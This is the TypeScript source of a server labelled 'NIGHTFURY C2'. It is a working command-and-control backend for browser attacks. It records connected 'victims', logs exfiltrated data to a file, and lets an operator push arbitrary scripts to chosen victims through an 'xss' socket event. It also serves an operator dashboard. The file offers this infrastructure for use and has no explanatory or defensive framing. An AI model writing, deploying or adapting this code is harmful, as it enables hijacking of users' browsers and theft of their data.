import express from "express";
import { createServer } from "http";
import { Server } from "socket.io";
import path from "path";
import fs from "fs";
import { fileURLToPath } from "url";
import { createServer as createViteServer } from "vite";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const server = createServer(app);
  const io = new Server(server, { cors: { origin: '*' } });

  const victims = new Map();
  const logs: any[] = [];

  // API / C2 Routes
  app.get('/api/victims', (req, res) => {
    res.json(Array.from(victims.values()));
  });

  app.get('/api/logs', (req, res) => {
    res.json(logs);
  });

  // Serve the dashboard HTML
  app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
  });

  io.on('connection', (socket) => {
    console.log(`[C2] New connection: ${socket.id}`);

    socket.on('register', (data) => {
      console.log(`[C2] Victim registered: ${socket.id}`, data);
      victims.set(socket.id, { id: socket.id, ...data, connected: Date.now() });
      io.emit('victims', Array.from(victims.values()));
    });

    socket.on('exfil', (data) => {
      console.log(`[C2] Data exfiltrated from ${socket.id}:`, data);
      const entry = { timestamp: new Date().toISOString(), socketId: socket.id, ...data };
      logs.push(entry);
      io.emit('exfil', entry);
      try {
        fs.appendFileSync('exfil.log', JSON.stringify(entry) + '\n');
      } catch (e) {
        console.error('Failed to write to exfil.log:', e);
      }
    });

    socket.on('inject', ({ targetId, script }) => {
      console.log(`[C2] Injecting script to ${targetId}`);
      const target = io.sockets.sockets.get(targetId);
      if (target) {
        target.emit('xss', { script });
      }
    });

    socket.on('disconnect', () => {
      console.log(`[C2] Victim disconnected: ${socket.id}`);
      victims.delete(socket.id);
      io.emit('victims', Array.from(victims.values()));
    });
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  const PORT = 3000;
  server.listen(PORT, "0.0.0.0", () => {
    console.log(`[NIGHTFURY C2] Server running on http://localhost:${PORT}`);
    console.log(`[NIGHTFURY C2] Dashboard available at http://localhost:${PORT}/dashboard`);
  });
}

startServer().catch(err => {
  console.error('Failed to start server:', err);
});
